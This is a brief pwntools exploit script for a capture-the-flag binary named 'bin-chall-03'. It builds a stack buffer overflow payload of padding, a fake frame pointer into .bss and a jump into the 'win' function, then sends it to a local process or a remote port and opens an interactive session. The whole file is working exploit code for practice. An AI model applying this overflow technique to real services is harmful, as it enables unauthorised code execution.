#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-03")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

win = elf.symbols["win"] + 67
writable = elf.bss(0x100)

pad = 0x20

payload = b"A" * pad
payload += flat(writable, win)

io.sendafter(b"Input: ", payload)

io.interactive()
